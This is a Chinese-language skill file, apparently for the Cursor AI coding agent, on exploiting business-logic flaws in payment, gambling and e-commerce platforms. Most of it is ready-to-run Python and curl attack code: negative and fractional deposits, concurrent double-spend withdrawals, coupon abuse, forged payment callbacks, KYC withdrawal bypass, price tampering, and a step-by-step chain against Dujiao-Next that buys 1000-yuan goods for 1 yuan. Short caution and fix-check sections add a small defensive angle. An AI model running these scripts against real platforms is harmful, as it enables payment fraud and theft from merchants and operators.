---
name: 商事·血路
description: >-
 支付/博彩平台业务逻辑漏洞：负金额、小数精度截断、并发重放竞争、
 优惠券/积分滥用、充值回调篡改、提现前置条件绕过、赔率/结算逻辑漏洞、
 代付/假支付伪造。
 假支付 HTTP 回调走 payment-callback-forgery；USDT 归属走 usdt-deposit-attribution-hijack。
 提款 saga / fundsn 跳步 / 双路径资金 API 走 fund-edge-ops。
---

# 支付 / 博彩平台业务逻辑漏洞（Cursor Skill）

## 何时用

- 支付/金融平台：充值、提现、转账、积分兑换
- 博彩平台：下注金额、结算逻辑、赔率字段
- 电商平台：优惠券、价格参数、购物车
- 任何涉及金钱/分值的 API 接口

---

## 1. 负金额 / 零金额攻击

```python
# 充值 -100，变相提款
payloads = [
 {"amount": -100},
 {"amount": "-100"},
 {"amount": 0},
 {"amount": 0.001}, # 精度截断
 {"amount": "0.001"},
 {"amount": -0.01},
]

for p in payloads:
 r = httpx.post(f"{TARGET}/api/recharge",
 json={"amount": p["amount"], **p},
 headers=headers)
 if r.status_code == 200:
 d = r.json()
 print(f"[!] 成功: {p} → {d}")
```

---

## 2. 浮点精度漏洞

```python
# 精度截断：充值 0.001 → 服务端以整数存储 → 0
# 大量充值 0.001 → 手续费吃完但余额不减
# 某些平台：充值 9.999 → 按 10 计算，服务端收 10 但扣费 9.999

import httpx, time

TARGET = "https://目标"
TOKEN = "YOUR_TOKEN"

# 批量微额充值测试
for i in range(10):
 r = httpx.post(f"{TARGET}/api/deposit",
 json={"amount": 0.001, "currency": "CNY"},
 headers={"Authorization": f"Bearer {TOKEN}"})
 print(f"[{i}] {r.status_code}: {r.text[:100]}")
 time.sleep(0.5)

# 查余额
bal = httpx.get(f"{TARGET}/api/balance", headers={"Authorization": f"Bearer {TOKEN}"})
print(f"余额: {bal.json()}")
```

---

## 3. 竞争条件（Race Condition）双花

```python
#!/usr/bin/env python3
"""并发请求实现双花：发送同一 trade_no 两次"""
import httpx, threading, time

TARGET = "https://目标"
TOKEN = "YOUR_TOKEN"
WITHDRAW_AMOUNT = 100

results = []

def withdraw(idx):
 r = httpx.post(f"{TARGET}/api/withdraw",
 json={"amount": WITHDRAW_AMOUNT, "to": "attacker_addr"},
 headers={"Authorization": f"Bearer {TOKEN}"},
 timeout=10)
 results.append((idx, r.status_code, r.text[:100]))

# 并发 10 个提款请求
threads = [threading.Thread(target=withdraw, args=(i,)) for i in range(10)]
start = time.time()
for t in threads: t.start()
for t in threads: t.join()
elapsed = time.time() - start

print(f"耗时: {elapsed:.2f}s")
success = [(i, s, t) for i, s, t in results if s == 200]
print(f"成功 {len(success)}/10 次")
for item in success:
 print(f" [{item[0]}] {item[1]}: {item[2][:80]}")
```

---

## 4. 优惠券/积分滥用

```bash
# 1. 并发使用同一优惠码（竞争条件）
for i in $(seq 1 10); do
 curl -s -X POST "$TARGET/api/coupon/apply" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"code":"DISCOUNT50"}' &
done
wait

# 2. 不同账号重复领取（同一 device_id / IP）
# 注册 10 个账号，都申请同一活动

# 3. 积分转账后再退款（余额归零但积分还在）
curl -s -X POST "$TARGET/api/points/transfer" \
 -H "Authorization: Bearer $TOKEN" \
 -d "{\"to\": \"$OTHER_USER\", \"amount\": 1000}"

# 4. 参数污染绕过限制
# 把 promo_code 放在 URL 参数和 body 中同时出现
curl -s -X POST "$TARGET/api/order?promo=CODE1" \
 -H "Authorization: Bearer $TOKEN" \
 -d '{"promo_code":"CODE2","amount":100}'
```

---

## 5. 充值回调篡改（详见 payment-callback-forgery）

```bash
# 快速验证：伪造回调签名
# 找到支付平台的回调端点（通常无认证）
curl -s -X POST "$TARGET/api/payment/notify" \
 -H "Content-Type: application/x-www-form-urlencoded" \
 -d "trade_no=YOUR_TRADE_NO&amount=9999&status=paid&sign=FAKE"

# 比较真实回调签名算法（通常 MD5(key+params)）
# 如有 HMAC-SHA1/256，需要正确的密钥
```

---

## 6. 提现前置条件绕过

```bash
# 常见前置条件：
# - 实名认证
# - 手机绑定
# - 最低余额
# - KYC 审核

# 测试绕过：直接打提现接口，看是否校验
curl -s -X POST "$TARGET/api/withdraw" \
 -H "Authorization: Bearer $UNVERIFIED_TOKEN" \
 -d '{"amount":100,"address":"test_addr"}'

# 参数顺序绕过：先提款再触发验证
# 尝试提款接口不同参数顺序

# 绕过金额上限（枚举）
for amount in 9999 10000 10001 99999 100000; do
 r=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET/api/withdraw" \
 -H "Authorization: Bearer $TOKEN" \
 -d "{\"amount\":$amount}")
 echo "amount=$amount: HTTP $r"
done
```

---

## 7. 博彩赔率/结算漏洞（PC28/彩票）

```python
# 参考 gambling-platform-odds-audit skill

# 1. 拉取 odds 配置，找特殊字段
import httpx
r = httpx.get(f"{TARGET}/api/games/{GAME_ID}", headers=headers)
config = r.json()

# 检查特殊字段
special_fields = [
 "1314", "red_line", "normal_1314", "maximum_payout",
 "is_special_straight", "normal_red_line"
]
for f in special_fields:
 if f in str(config):
 print(f"[!] 发现特殊字段: {f}")

# 2. 整期结算验证
# 拿上期全部投注 + 开奖结果，逐笔重算验证
r_bets = httpx.get(f"{TARGET}/api/games/{GAME_ID}/bets/prev", headers=headers)
r_result = httpx.get(f"{TARGET}/api/issues/{ISSUE_ID}", headers=headers)
```

---

## 8. 价格参数篡改（电商）

```bash
# 购物车价格参数
curl -s -X POST "$TARGET/api/cart/checkout" \
 -H "Authorization: Bearer $TOKEN" \
 -H "Content-Type: application/json" \
 -d '{
 "items": [{"id": 1, "qty": 1, "price": 0.01}],
 "total": 0.01
 }'

# URL 参数价格
curl -s -X GET "$TARGET/api/product/1?price=0.01&discount=99"

# 订单确认时修改金额
curl -s -X POST "$TARGET/api/order/confirm" \
 -d '{"order_id":"12345","amount":0.01,"currency":"CNY"}'
```

---

## 9. 常见成功指标

| 攻击向量 | 成功信号 |
|---------|---------|
| 负金额充值 | 余额增加 / 对方减少 |
| 精度截断 | 余额 > 预期 |
| 竞争双花 | 2+ 个提款成功 + 余额异常 |
| 优惠券复用 | 多次折扣叠加 |
| 赔率漏洞 | EV > 0 的可重复操作 |

---

## 10. 成功口径

| 级别 | 描述 |
|------|------|
| L1 | 确认业务逻辑缺陷（API 不校验）|
| L2 | 自控账号余额异常增加或跌到负数 |
| L3 | 可重复利用，量化了潜在损失 |

---

## 11. 不要做

- 大额真实测试（只用 1 元或授权测试金额）
- 提现到真实账户
- 攻击真实用户的账户余额
- 在无授权情况下利用赔率漏洞获利

---

## 12. 混合支付三缺陷框架（Dujiao-Next 模型，Go/PHP 电商通用）

**适用场景**：站点具备「余额 + 多渠道在线支付」混合付款功能时，必查三节点。  
**Dujiao-Next 会员字段**：创建支付用数字 **`order_id`**（订单 `id`），不是 `order_no`。用错会 400/空转。作业卡：`dujiao-next-1yuan-pay`。

### 缺陷① 回调履约不校验金额守恒

**检测逻辑**：

```
订单应付额（Total - WalletPaid） ≠ 支付记录金额 → 能履约 = 漏洞
```

**探针步骤**：

```bash
# 1. 用余额把在线应付额压到最小值（如 1 元）
curl -s -X POST "$TARGET/api/v1/payments" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"order_id\":$ORDER_ID,\"channel_id\":$CH_A,\"use_balance\":true}"
# → 观察 payment.amount，应等于 (订单总额 - 余额)

# 2. 换渠道释放余额（在线应付额回到全额）
curl -s -X POST "$TARGET/api/v1/payments" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"order_id\":$ORDER_ID,\"channel_id\":$CH_B,\"use_balance\":false}"
# → 观察余额是否退回

# 3. 再次请求原渠道 → 检查是否复用旧小额链接
curl -s -X POST "$TARGET/api/v1/payments" \
  -H "Authorization: Bearer $TOKEN" \
  -d "{\"order_id\":$ORDER_ID,\"channel_id\":$CH_A,\"use_balance\":false}"
# → 若返回 payment.id 与步骤1相同 = 缺陷③旧链接复用

# 4. 在网关实付小额，观察订单是否被全额履约
```

**漏洞信号**：`支付 1 元 → 订单 status=paid → 商品自动交付`

---

### 缺陷② 钱包扣款幂等键静态（轮次未区分）

**原理**：若幂等键恒为 `order:<id>:order_pay`，则"用余额→退回→再用余额"的第二轮会命中已被冲正的旧流水，**不执行真实扣款，却向订单写入余额已付金额**。

**检测序列**：

```python
import httpx

BASE = "https://TARGET"
H = {"Authorization": f"Bearer {TOKEN}"}
ORDER_ID = 12345  # 数字 id，不是 order_no

# 步骤1：渠道A 用余额（扣款 999，在线应付 1 元）
r1 = httpx.post(f"{BASE}/api/v1/payments",
    json={"order_id": ORDER_ID, "channel_id": CH_A, "use_balance": True}, headers=H)
# 步骤2：渠道B 纯在线（余额退回 999）
r2 = httpx.post(f"{BASE}/api/v1/payments",
    json={"order_id": ORDER_ID, "channel_id": CH_B, "use_balance": False}, headers=H)
# 步骤3：渠道C 再用余额
r3 = httpx.post(f"{BASE}/api/v1/payments",
    json={"order_id": ORDER_ID, "channel_id": CH_C, "use_balance": True}, headers=H)

# 漏洞信号：步骤3 后，查余额 API 仍为 999（未扣款），
# 但订单 wallet_paid_amount = 999（账面已付）
bal = httpx.get(f"{BASE}/api/v1/wallet/balance", headers=H).json()
print(f"余额: {bal}（应为0；若仍为999 = 幂等键漏洞存在）")
```

---

### 缺陷③ 旧支付链接无网关侧作废

**检测**：

```bash
# 检查代码库是否存在 supersede/close/cancel 网关关单函数（用 rg 兼容 macOS）
rg "SupersedePending|closeOrder|close_trade|cancelOrder" --type go --type php .

# 若空结果 = 网关侧无关单能力，旧链接在网关持续有效
# 验证：取步骤1的 pay_url（1元链接），在步骤2换渠道后直接访问，若网关仍可付 = 漏洞成立
```

---

### 完整攻击链（变体A，成功率 100%）

```
前置：余额 = 商品价 - 1 元（如 1000 元商品充 999）

步骤1: POST /payments  渠道A use_balance=true  → 在线应付 1 元，得链接 L1（1元）
步骤2: POST /payments  渠道B use_balance=false  → 余额退回 999，L1 仍可付
步骤3: POST /payments  渠道A use_balance=false  → 复用 L1
步骤4: 网关实付 1 元   → 验签回调 → 订单 paid → 自动发货
结果: 实收 1 元，履约 1000 元商品，999 元余额无损，可无限次重复
```

---

### 修复参照（检验目标是否已修复）

| 检验项 | 已修复信号 |
|---|---|
| 缺陷① | 回调处 `coveredAmount < requiredOnlineAmount` 时订单不履约，金额转余额 |
| 缺陷② | 幂等键含轮次后缀（如 `order:<id>:order_pay:2`） |
| 缺陷③ | 创建支付时调用 supersede 函数作废旧 pending |

---

### 对账稽核盲区（自有站必查）

```sql
-- 找"账面收款额 > 实际支付记录金额"的可疑订单
SELECT o.order_no, o.online_paid_amount, p.amount AS payment_amount,
       o.online_paid_amount - p.amount AS delta
FROM orders o
JOIN payments p ON p.order_id = o.id AND p.status = 'success'
WHERE o.online_paid_amount > p.amount + 0.01
ORDER BY delta DESC;

-- 找"同一订单 order_pay + order_refund 交替，后续 order_pay 无扣款"的账户
SELECT reference, COUNT(*) FROM wallet_transactions
WHERE reference LIKE 'order:%:order_pay'
GROUP BY reference HAVING COUNT(*) > 1;
```

---

## 真源

- 假支付回调：`杀招/秦百胜·回响` · `炼蛊房/pay_matrix.py`
- USDT 归属：`杀招/马鸿运·稳币`
- 提款 saga / wallet_id / 展示层：`杀招/血神子·锋` · `logic_vuln_probe.py` 仍打单接口竞态
- 竞争条件：`杀招/时道抢先`
- 赔率审计：`杀招/房睇长·赔率`
- 手法：`传承/酒虫·回放.md`
- **Dujiao-Next 三缺陷 PoC 原报告**：`DJS-2026-0828-01`（v1.4.3，修复版 f57247b4）
